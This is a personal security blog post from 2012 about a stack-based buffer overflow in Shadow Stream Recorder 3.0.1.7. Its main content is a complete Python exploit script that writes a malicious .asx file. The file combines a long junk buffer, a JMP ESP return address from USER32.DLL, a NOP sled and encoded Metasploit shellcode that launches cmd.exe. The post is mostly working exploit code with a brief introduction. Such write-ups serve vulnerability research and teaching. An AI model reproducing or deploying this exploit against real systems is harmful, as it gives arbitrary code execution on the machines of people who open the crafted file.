<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
    <meta name="description" content="Personal Weblog"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>‡§Æ‡§Ç‡§•‡§® | Manthan</title>
    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.css"/>
    <link id="codestylesheet" rel="stylesheet" type="text/css" media="screen" href="/static/css/atelier-forest-light.css">
    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
    <script charset="UTF-8" src="/static/js/go.min.js"></script>
   </head>
  <body>
    <div class="body">
      <div class="menu">
        <table>
          <tr>
            <td colspan="3"><a class="menu_home" href="/index.html">‡§Æ‡§Ç‡§•‡§®</a></td>
          </tr>
          <tr>
            <td><a class="menu_archive" href="/archive.html">üíæ Archive</a></td>
            <td><a class="menu_tags" href="/tags.html">üîñ Tags</a></td>
            <td><a class="menu_stats" href="/stats.html">üìä Stats</a></td>
            <!--<td>-->
            <!--  <label class="theme-switch" for="checkbox">-->
            <!--    <input type="checkbox" id="checkbox" />-->
            <!--    <div class="slider round"></div>-->
            <!--  </label>-->
            <!--</td>-->
          </tr>
        </table>
      </div>
      <div class="content">
          <h1 class="h1 title collapsible" onclick="toggle(this);">Shadow Stream Recorder .asx File Parsing Buffer Overflow</h1>
    <div class="title"><code><span class="sparklines"><span style="color:#6610f2;">‚ñÑ</span><span style="color:#69359c;">‚ñÇ</span><span style="color:#e83e8c;">‚ñÜ</span><span style="color:#99cc99;">‚ñá</span><span style="color:#f44336;">‚ñÇ</span><span style="color:#dc3545;">‚ñÖ</span><span style="color:#ffcc66;">‚ñÇ</span><span style="color:#17a2b8;">‚ñÑ</span><span style="color:#a50b5e;">‚ñÖ</span><span style="color:#0c9;">‚ñÅ</span><span style="color:#ffc107;">‚ñá</span><span style="color:#ffc107;">‚ñÑ</span><span style="color:#dc3545;">‚ñá</span><span style="color:#20b2aa;">‚ñÖ</span><span style="color:#99cc99;">‚ñá</span><span style="color:#99cc99;">‚ñÉ</span><span style="color:#a50b5e;">‚ñÜ</span><span style="color:#4caf50;">‚ñÇ</span><span style="color:#00b7eb;">‚ñÇ</span><span style="color:#0c9;">‚ñÉ</span><span style="color:#20c997;">‚ñÇ</span><span style="color:#8357ff;">‚ñÅ</span><span style="color:#e83e8c;">‚ñÅ</span><span style="color:#5b92e5;">‚ñÖ</span><span style="color:#6c757d;">‚ñá</span><span style="color:#69359c;">‚ñÖ</span><span style="color:#99cc99;">‚ñÑ</span><span style="color:#2196f3;">‚ñÅ</span><span style="color:#0c9;">‚ñÜ</span><span style="color:#e83e8c;">‚ñÇ</span><span style="color:#5b92e5;">‚ñÇ</span><span style="color:#f44336;">‚ñá</span><span style="color:#69359c;">‚ñÑ</span><span style="color:#28a745;">‚ñá</span><span style="color:#00bcd4;">‚ñÇ</span><span style="color:#69359c;">‚ñÇ</span><span style="color:#dc3545;">‚ñÉ</span><span style="color:#00b7eb;">‚ñá</span><span style="color:#17a2b8;">‚ñÖ</span><span style="color:#5b92e5;">‚ñÇ</span><span style="color:#0c9;">‚ñá</span><span style="color:#5b92e5;">‚ñà</span><span style="color:#17a2b8;">‚ñÇ</span><span style="color:#007bff;">‚ñÇ</span><span style="color:#99cc99;">‚ñÑ</span><span style="color:#2196f3;">‚ñÑ</span><span style="color:#8357ff;">‚ñÇ</span><span style="color:#6f42c1;">‚ñá</span><span style="color:#fd7e14;">‚ñÑ</span><span style="color:#69359c;">‚ñÜ</span><span style="color:#ffcc66;">‚ñà</span><span style="color:#a50b5e;">‚ñà</span><span style="color:#69359c;">‚ñÑ</span><span style="color:#8357ff;">‚ñÜ</span><span style="color:#fd7e14;">‚ñÉ</span><span style="color:#ffc107;">‚ñÖ</span><span style="color:#e83e8c;">‚ñá</span><span style="color:#e83e8c;">‚ñÉ</span><span style="color:#a50b5e;">‚ñÖ</span><span style="color:#007bff;">‚ñÑ</span><span style="color:#20c997;">‚ñÉ</span><span style="color:#20b2aa;">‚ñÇ</span><span style="color:#f44336;">‚ñÖ</span><span style="color:#5b92e5;">‚ñÖ</span></span></code></div>
    <hr>
          <p style="float:left;"><a href="/posts/20120827_geras-wuos-stack1-solutions.html"> ¬´ </a>üìÖ published on <code>02/Sep/2012</code><a href="/posts/20120902_millenium-mpf-seh.html"> ¬ª </a></p>
        <p style="float:right;">üîñ tagged <a href=/tags.html#code>code</a> and <a href=/tags.html#exploit>exploit</a></p>
    <div style="clear:both;"></div>
    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Introduction</h2>
<p class="nested active">The Shadow Stream Recorder version 3.0.1.7 has a classic stack-based buffer overflow vulnerability. Processing specially-crafted Advanced Stream Redirector (ASX) media files triggered a memory corruption error. This flaw could be exploited to gain arbitrary code execution. The exploit for this vulnerability is a vanilla EIP overwrite and has been first documented at <a href="http://www.exploit-db.com/exploits/11957/">EDB: 11957</a></p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Exploit Code</h2>
<p class="nested active">Here is a complete rewrite of this exploit:</p>
<pre class="nested active"><code class="language-python">from struct import *

file = &quot;edb11957.asx&quot;

# msfpayload windows/exec CMD=cmd.exe R | msfencode -b '\x00\x0a\x0d' -t perl
# [*] x86/shikata_ga_nai succeeded with size 226 (iteration=1)

cmmd = (&quot;\xda\xd5\xb8\x4f\xc1\x95\xae\xd9\x74\x24\xf4\x5a\x29\xc9&quot; +
&quot;\xb1\x32\x83\xc2\x04\x31\x42\x16\x03\x42\x16\xe2\xba\x3d&quot; +
&quot;\x7d\x27\x44\xbe\x7e\x58\xcd\x5b\x4f\x4a\xa9\x28\xe2\x5a&quot; +
&quot;\xba\x7d\x0f\x10\xee\x95\x84\x54\x26\x99\x2d\xd2\x10\x94&quot; +
&quot;\xae\xd2\x9c\x7a\x6c\x74\x60\x81\xa1\x56\x59\x4a\xb4\x97&quot; +
&quot;\x9e\xb7\x37\xc5\x77\xb3\xea\xfa\xfc\x81\x36\xfa\xd2\x8d&quot; +
&quot;\x07\x84\x57\x51\xf3\x3e\x56\x82\xac\x35\x10\x3a\xc6\x12&quot; +
&quot;\x80\x3b\x0b\x41\xfc\x72\x20\xb2\x77\x85\xe0\x8a\x78\xb7&quot; +
&quot;\xcc\x41\x47\x77\xc1\x98\x80\xb0\x3a\xef\xfa\xc2\xc7\xe8&quot; +
&quot;\x39\xb8\x13\x7c\xdf\x1a\xd7\x26\x3b\x9a\x34\xb0\xc8\x90&quot; +
&quot;\xf1\xb6\x96\xb4\x04\x1a\xad\xc1\x8d\x9d\x61\x40\xd5\xb9&quot; +
&quot;\xa5\x08\x8d\xa0\xfc\xf4\x60\xdc\x1e\x50\xdc\x78\x55\x73&quot; +
&quot;\x09\xfa\x34\x1e\xcc\x8e\x43\x67\xce\x90\x4b\xc8\xa7\xa1&quot; +
&quot;\xc0\x87\xb0\x3d\x03\xec\x4f\x74\x09\x45\xd8\xd1\xd8\xd7&quot; +
&quot;\x85\xe1\x37\x1b\xb0\x61\xbd\xe4\x47\x79\xb4\xe1\x0c\x3d&quot; +
&quot;\x25\x98\x1d\xa8\x49\x0f\x1d\xf9\x2a\xc2\x85\x2c\xc9\x64&quot; +
&quot;\x23\x31&quot;)

junk = &quot;A&quot;*26085
neip = pack ('&lt;I', 0x7E4456F7) # 7E4456F7  FFE4  JMP ESP USER32.DLL
nops = &quot;\x90&quot;*56

sploit = junk+neip+nops+cmmd

try:
    handle = open (file, 'w')
    handle.write (sploit)
    handle.close ()
    print &quot;[+] sploit ready: &quot; + file + &quot; (&quot; + str (len (sploit)) + &quot;B)&quot;
except:
    print &quot;[-] exception!&quot;
</code></pre>
    <hr>
          <p style="float:left;">¬´ <a href="/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 ...</a> ¬´</p>
      <p style="float:right;">¬ª <a href="/posts/20120902_millenium-mpf-seh.html">Millennium MP3 Studio .mpf Fil...</a> ¬ª</p>
          </div>
      <div><a class="footer" href="https://github.com/7h3rAm/7h3rAm.github.io">Óäë Óäê Óäó</a></div>
      <script>hljs.initHighlightingOnLoad();</script>
      <script>hljs.initLineNumbersOnLoad();</script>
      <script>
        function toggle(s){
          s.classList.toggle("expanded");
          var t=!1,i=!1,a=!1;
          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
          for(var l=s.nextElementSibling;l;){
            if(t&&l.classList.contains("h2")){
              l.classList.toggle("active");
              break
            }
            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
              l.classList.toggle("active");
              break
            }
            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
              l.classList.toggle("active");
              break
            }
            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
          }
        }
      </script>
      <script type="text/javascript">
        const toggleSwitch = document.querySelector('.theme-switch input[type="checkbox"]');
        const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
        if (currentTheme) {
          document.documentElement.setAttribute('data-theme', currentTheme);
          if (currentTheme === 'dark') {
            toggleSwitch.checked = true;
            document.documentElement.setAttribute('data-theme', 'dark');
            document.getElementById('codestylesheet').setAttribute('href', '/static/css/zenburn.min.css');
            localStorage.setItem('theme', 'dark');
          } else {
            toggleSwitch.checked = false;
            document.documentElement.setAttribute('data-theme', 'light');
            document.getElementById('codestylesheet').setAttribute('href', '/static/css/atelier-forest-light.css');
            localStorage.setItem('theme', 'light');
          }
          console.log("pageload: theme:" + currentTheme + " switch:" + toggleSwitch.checked);
        }
        function switchTheme(e) {
          if (e.target.checked) {
            document.documentElement.setAttribute('data-theme', 'dark');
            document.getElementById('codestylesheet').setAttribute('href', '/static/css/zenburn.min.css');
            localStorage.setItem('theme', 'dark');
          } else {
            document.documentElement.setAttribute('data-theme', 'light');
            document.getElementById('codestylesheet').setAttribute('href', '/static/css/atelier-forest-light.css');
            localStorage.setItem('theme', 'light');
          }    
          const toggleSwitch = document.querySelector('.theme-switch input[type="checkbox"]');
          const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
          console.log("pageload: theme:" + currentTheme + " switch:" + toggleSwitch.checked);
        }
        toggleSwitch.addEventListener('change', switchTheme, false);
      </script>
    </div>
  </body>
</html>